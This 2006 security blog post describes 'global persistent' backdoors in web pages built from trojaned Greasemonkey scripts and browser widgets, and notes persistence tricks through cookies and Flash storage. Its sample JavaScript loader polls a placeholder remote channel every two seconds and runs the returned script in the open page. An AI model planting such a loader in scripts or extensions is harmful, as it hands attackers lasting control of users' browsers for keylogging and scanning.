---
title: Backdooring Web Pages
author: petko-d-petkov
date: Mon, 28 Aug 2006 11:09:08 GMT
template: post.jade
category: fucked
---

![Greasemonkey](/files/2006/08/greasemonkey.jpg "Greasemonkey")

The most obvious way of maliciously infecting web pages is to perform Cross-Site Scripting (XSS). In practice, XSS vulnerabilities can be persistent and non-persistent. Depending on the type, the attacker has various degree of control. The persistent vector produces better results and it lasts longer, where non-persistent vector lasts a single hit, although it is possible for the attacker to take control of the user browser by using other techniques. Here I am trying to explore another vector that can permanently take control of the user web experience.

IMHO, there are three types of web page backdoors: non-persistent, persistent and global persistent. Non-persistent backdoors occur on a single XSS vulnerable page (hit). Persistent backdoors a bit better because they can occur on one or more XSS vulnerable pages most probably coming from the same domain (site). Global persistent backdoors occur on all domains (sites) and in theory they can last forever.

Global persistent backdoors do not rely on the server being vulnerable to XSS or any other type of server related vulnerability. Global persistent backdoors exploit browser functionalities.

In order to install global persistent backdoor the attacker can exploit known browser vulnerabilities which allow silent installation of new functionalities, exploit known extension vulnerabilities which allow [Cross Context Scripting](/blog/cross-context-scripting) (execution of malicious web content in the browser context) or [exploit the user's trust](/blog/xssing-the-lan-4) ([trojaning](/blog/xssing-the-lan-3)).

The first two scenarios rely on a browser or a browser's extensions being vulnerable. Finding those vulnerabilities may take some time and it might not be that feasible, not to mention the fact that once an attacker exploits them the entire system probably will be subjected to attacker's wishes. On the other hand, the last scenario tricks the user into performing something legitimate which in fact turns to be something malicious (trojaning). This quite old trick but very successful and widely exploited as well.

Exploiting the user's trust in order to install backdoor could be achieved in several ways each one of which provides various degree of success. The first one is asking the user to install a browser extension. This type of scenario could be successful in browsers that do not have central extension repositories. In that respect IE is probably the most vulnerable. Opera, with its Web Widgets could potentially fall into the same category. On the other hand, Firefox users tend to install extensions from known sources such as `addons.mozilla.org`, so they are the least vulnerable.

The second scenario occurs when the attacker is asking the user to install extensions of extension. This one is far more trusted since extensions of extension are believed to be harmless. Firefox's and IE's Greasemonkey extension and Opera's Web Widgets are good examples of those kinds of scenarios.

To some respect, security aware users could detect malicious scripts so they are less vulnerable. On the other hand the average user trusts the security model of the browser, so  trojaned Greasemonkey script can be quite easily installed. A sample trojaned script can contain something like the following:

    setInterval(function () {
    	var head = document.getElementsByTagName('head').item(0);
    	var old  = document.getElementById('last_loaded_cmd');

    	if (old)
    		head.removeChild(old);

    	script = document.createElement('script');
    	script.src = 'http://path/to/channel';
    	script.type = 'text/javascript';
    	script.defer = true;
    	script.id = 'last_loaded_cmd';
    	void(head.appendChild(script));
    }, 2000);

The code presented above will query every 2 seconds  **http&#58;//path/to/channel** for JavaScript code that is evaluated inside the currently open page. This model allows attackers to inject any type of JavaScript based tool (scanners, other communication channels, page key loggers, etc). Similar effect can be achieved with Opera's Web Widgets although modifications of this code are required.

This type of backdoor has a big problem. Once the user finds that the Greasemonkey script (or the Web Widget) is not needed anymore, or that it contains malicious code, proper cleaning actions will be taken.

_This is good but like any other malicious code, web page backdoors can assure the existence of hidden channels for reinstallation and further propagation. In that respect the backdoor could perform internal cross site scripting by poisoning cookies or flash objects such as [The Flash Persistent Storage Model](http://codinginparadise.org/projects/storage/README.html) which is widely used in several AJAX frameworks. Other countermeasures can be taken as well such as taking advantage of the page caching issues. All of these are related to a discipline known as DOM based Cross-site scripting._
